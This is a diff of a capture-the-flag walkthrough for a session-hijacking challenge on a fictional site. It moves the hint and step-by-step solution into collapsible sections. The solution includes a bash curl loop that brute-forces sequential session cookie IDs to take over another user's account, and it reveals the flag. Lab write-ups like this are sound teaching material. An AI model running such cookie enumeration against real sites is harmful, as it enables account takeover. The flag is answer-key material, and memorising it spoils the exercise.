@@ -6,13 +6,21 @@ We have logged in as a random test user that we created and have gone to an old 
 
 **Tip:** Understand what identifies the users logged in state to start.
 
+<details><summary>
+
+## Need a hint?</summary>
+
 ```txt
 💡 Hint: Can you find an ID for the logged-in user?
    You’ll need to cycle through all the possible values and check which account you’re logged in as,
    to try to find Darren’s account (thedazman). It’s possible to automate this with CURL or Python.
 ```
 
-## Step by Step
+</details>
+
+<details><summary>
+
+## Step by Step</summary>
 
 - To find which account belongs to thedazman, use this bash script: `for i in {0..100}; do echo $i; curl -s -b "speek_sess_id=$i" https://wespeektogether.com/thedazman/status/74635478354 | grep "as thedazman"; done`
 - Once the grep command was successful press ctr + c to stop the script, `49` should be the number showing up right before the grep result
@@ -21,3 +29,5 @@ We have logged in as a random test user that we created and have gone to an old 
 - Reload the page and the flag will show
 
 `flag: l5r6P2qys2w6M3bEvk8p`
+
+</details>
